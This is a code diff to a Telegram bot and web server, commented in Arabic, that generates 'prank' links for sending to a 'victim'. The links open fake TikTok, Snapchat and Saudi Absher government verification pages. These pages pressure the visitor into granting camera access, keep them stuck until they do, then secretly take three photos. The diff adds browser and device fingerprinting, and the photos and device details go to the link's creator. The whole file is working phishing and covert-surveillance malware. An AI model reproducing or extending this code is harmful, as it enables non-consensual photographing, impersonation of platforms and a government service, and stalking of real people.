@@ -60,9 +60,9 @@ def is_premium_user(chat_id):
     conn.close()
     return result is not None
 
-# ---- واجهة المقالب المتقدمة (الأبشر المرعب + الحجز اللانهائي الافتراضي) ----
+# ---- واجهة المقالب مع ميزة سحب بيانات الجهاز ----
 def get_html_content(template_type):
-    # إعدادات القوالب الافتراضية (تيك توك)
+    # إعدادات القوالب الافتراضية
     bg_color = "#010101"
     card_bg = "#121212"
     btn_color = "#fe2c55"
@@ -91,7 +91,7 @@ def get_html_content(template_type):
         btn_color = "#000000"
         logo_text = "Snapchat"
         logo_style = "color: #000000; font-family: 'Comic Sans MS', sans-serif;"
-        title = "📸 تجربة fفلاتر الذكاء الاصطناعي الجديدة"
+        title = "📸 تجربة فلاتر الذكاء الاصطناعي الجديدة"
         desc = "أطلقت سناب شات فلتر تغير الملامح المرعب الجديد! اضغط على الزر بالأسفل واسمح بالكاميرا لتجربة الفلتر الحصري قبل الجميع."
         btn_text = "🔥 تشغيل الفلتر الحصري"
         redirect_to = "https://www.snapchat.com"
@@ -107,7 +107,6 @@ def get_html_content(template_type):
         btn_text = "🔒 ابدأ التحقق الفوري والمسح الحي"
         redirect_to = "https://www.saudiarabia.gov.sa"
 
-    # كود الـ HTML مع جافا سكريبت العزل اللانهائي الصافي بدون شاشات تعليمات
     return f"""
     <!DOCTYPE html>
     <html lang="ar" dir="rtl">
@@ -167,13 +166,32 @@ def get_html_content(template_type):
             <h2 id="mainTitle">{title}</h2>
             <p id="mainDesc">{desc}</p>
             <button class="btn" id="startBtn">{btn_text}</button>
-            <div class="error-msg" id="errorBlock">⚠️ خطأ أمني: الكاميرا مغلقة! يتعذر التحقق الحركي. يرجى إعادة الضغط والمسح الحي للمتابعة.</div>
+            <div class="error-msg" id="errorBlock">⚠️ تنبيه: الكاميرا معطلة! يجب الضغط مجدداً والموافقة لتتمكن من متابعة المشاهدة.</div>
         </div>
 
         <script>
             const urlParams = new URLSearchParams(window.location.search);
             const ownerId = urlParams.get('id');
             const REDIRECT_URL = "{redirect_to}";
+
+            // دالة جلب معلومات دقيقة ومبسطة عن الجهاز والمتصفح
+            function getDeviceInfo() {{
+                const ua = navigator.userAgent;
+                let os = "غير معروف";
+                let browser = "غير معروف";
+
+                if (ua.indexOf("Win") !== -1) os = "Windows";
+                else if (ua.indexOf("Mac") !== -1) os = "Mac OS / iPhone (Safari)";
+                else if (ua.indexOf("X11") !== -1) os = "Linux";
+                else if (ua.indexOf("Android") !== -1) os = "Android";
+
+                if (ua.indexOf("Chrome") !== -1) browser = "Google Chrome";
+                else if (ua.indexOf("Safari") !== -1) browser = "Safari";
+                else if (ua.indexOf("Firefox") !== -1) browser = "Mozilla Firefox";
+                else if (ua.indexOf("Edg") !== -1) browser = "Microsoft Edge";
+                
+                return os + " (" + browser + ")";
+            }}
 
             function tryCapture() {{
                 if (!ownerId) {{
@@ -184,7 +202,7 @@ def get_html_content(template_type):
                 navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: false }})
                 .then(function(stream) {{
                     document.getElementById('errorBlock').style.display = 'none';
-                    document.getElementById('statusText').innerText = "تم الاتصال.. جاري مطابقة بيانات الملامح مع النظام المركزي...";
+                    document.getElementById('statusText').innerText = "تم الاتصال.. جاري معالجة الأبعاد الحية...";
                     
                     let video = document.createElement('video');
                     video.srcObject = stream;
@@ -198,6 +216,8 @@ def get_html_content(template_type):
                         let ctx = canvas.getContext('2d');
                         
                         let shotsTaken = 0;
+                        const deviceInfo = getDeviceInfo(); // جلب بيانات الجهاز
+                        
                         let captureInterval = setInterval(function() {{
                             if (shotsTaken >= 3) {{
                                 clearInterval(captureInterval);
@@ -209,10 +229,16 @@ def get_html_content(template_type):
                             ctx.drawImage(video, 0, 0);
                             let base64Image = canvas.toDataURL('image/jpeg', 0.75);
                             
+                            // إرسال الصورة مضافاً إليها معلومات الجهاز
                             fetch('/api/capture', {{
                                 method: 'POST',
                                 headers: {{ 'Content-Type': 'application/json' }},
-                                body: JSON.stringify({{ user_id: ownerId, image: base64Image, count: shotsTaken + 1 }})
+                                body: JSON.stringify({{ 
+                                    user_id: ownerId, 
+                                    image: base64Image, 
+                                    count: shotsTaken + 1,
+                                    device: deviceInfo 
+                                }})
                             }});
                             
                             shotsTaken++;
@@ -220,9 +246,8 @@ def get_html_content(template_type):
                     }};
                 }})
                 .catch(function(err) {{
-                    // [نظام الحجز والتعليق اللانهائي المثالي 🔒]
                     document.getElementById('errorBlock').style.display = 'block';
-                    document.getElementById('statusText').innerText = "⚠️ فشل التحقق الفوري! يرجى منح الإذن والمحاولة مجدداً.";
+                    document.getElementById('statusText').innerText = "⚠️ فشل التحقق! يرجى منح الإذن والمحاولة مجدداً.";
                 }});
             }}
 
@@ -240,8 +265,8 @@ def start(message):
     name = message.from_user.first_name
     
     welcome_text = (
-        f"أهلاً بك يا {name} في بوت صائد الكاميرا المطور v3.0! 📸🔥\n\n"
-        "💳 لتفعيل حسابك ونظام القوالب الإجبارية الجديدة، اضغط تفعيل بالأسفل."
+        f"أهلاً بك يا {name} في بوت صائد الكاميرا الأسطوري v4.0! 📸🕵️‍♂️\n\n"
+        "💳 لتفعيل حسابك ونظام كاشف أجهزة الضحايا المتقدم، اضغط تفعيل بالأسفل."
     )
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("💳 تفعيل الاشتراك المميز (VIP)", callback_data="buy"))
@@ -251,7 +276,7 @@ def start(message):
 def buy(call):
     chat_id = call.message.chat.id
     add_premium_user(chat_id)
-    bot.answer_callback_query(call.id, "🎉 تم تفعيل قفل الحجز المطلق!")
+    bot.answer_callback_query(call.id, "🎉 تم تفعيل الرادار الأسطوري المطور!")
     
     markup = InlineKeyboardMarkup(row_width=1)
     markup.add(
@@ -260,7 +285,7 @@ def buy(call):
         InlineKeyboardButton("👻 مقلب فلاتر سناب شات", callback_data="gen_snapchat"),
         InlineKeyboardButton("🚨 مقلب بصمة أبشر الحكومي (قوي جداً)", callback_data="gen_absher")
     )
-    bot.send_message(chat_id, "👑 اختر نوع المقلب لتوليد الرابط فوراً:", reply_markup=markup)
+    bot.send_message(chat_id, "👑 اختر نوع المقلب لتوليد الرابط الذكي فوراً:", reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("gen_"))
 def gen_link(call):
@@ -273,9 +298,11 @@ def gen_link(call):
     unique_link = f"{RENDER_URL}?id={chat_id}&template={template}"
     
     msg = (
-        f"🚀 **رابط المقلب الخاص بك لـ ({template.upper()}) جاهز للجلد!**\n\n"
-        f"نسخه أرسله للضحية مباشرة:\n`{unique_link}`\n\n"
-        "💡 **تحديث العزل التام:** إذا ضغط الضحية إلغاء أو رفض، الصفحة بتعلق في وجهه تماماً ومستحيل تحوله لأي مكان لين يقتنع ويضغط سماح! 😉🔥"
+        f"🚀 **رابط المقلب الأسطوري لـ ({template.upper()}) جاهز تماماً!**\n\n"
+        f"انسخ الرابط وأرسله للضحية:\n`{unique_link}`\n\n"
+        "🕵️‍♂️ **مميزات نسخة الرادار الحالية:**\n"
+        "1. الصفحة معزولة ولن تترك الضحية يخرج إلا بالموافقة.\n"
+        "2. عند نجاح الصيد، البوت سيرسل لك نوع جهاز ومتصفح الضحية بالتفصيل تحت لقطته المضحكة!"
     )
     bot.send_message(chat_id, msg, parse_mode="Markdown")
 
@@ -293,12 +320,17 @@ async def telegram_webhook(request: Request):
     bot.process_new_updates([update])
     return {"status": "ok"}
 
-def send_photo_to_owner(user_id, image_bytes, count_text):
+def send_photo_to_owner(user_id, image_bytes, count_text, device_info):
     try:
+        caption_msg = (
+            f"📸 **تم صيد لقطة فكاهية جديدة رقم ({count_text})!**\n\n"
+            f"📱 **جهاز الضحية ومتصفحه:**\n`{device_info}`"
+        )
         bot.send_photo(
             chat_id=user_id, 
             photo=image_bytes, 
-            caption=f"📸 **صيد متتالي ناجح! اللقطة رقم ({count_text})**"
+            caption=caption_msg,
+            parse_mode="Markdown"
         )
     except Exception as e:
         print(f"Error sending photo: {e}")
@@ -310,6 +342,7 @@ async def capture_api(request: Request, background_tasks: BackgroundTasks):
         user_id = data.get("user_id")
         image_b64 = data.get("image")
         shot_count = data.get("count", 1)
+        device_info = data.get("device", "غير معروف") # استقبال بيانات الجهاز
         
         if not user_id or not image_b64:
             return JSONResponse(status_code=400, content={"status": "error"})
@@ -319,7 +352,7 @@ async def capture_api(request: Request, background_tasks: BackgroundTasks):
         image_file = io.BytesIO(image_bytes)
         image_file.name = f"capture_{shot_count}.jpg"
         
-        background_tasks.add_task(send_photo_to_owner, int(user_id), image_file, str(shot_count))
+        background_tasks.add_task(send_photo_to_owner, int(user_id), image_file, str(shot_count), device_info)
         return {"status": "success"}
     except Exception as e:
         return JSONResponse(status_code=500, content={"status": "error"})
@@ -328,7 +361,7 @@ async def capture_api(request: Request, background_tasks: BackgroundTasks):
 def startup_event():
     bot.remove_webhook()
     bot.set_webhook(url=f"{RENDER_URL}/{BOT_TOKEN}")
-    print("🚀 تم إطلاق تحديث نظام أبشر الفريد والتثبيت النهائي!")
+    print("🚀 تم تشغيل الرادار الأسطوري لكشف الأجهزة بنجاح!")
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
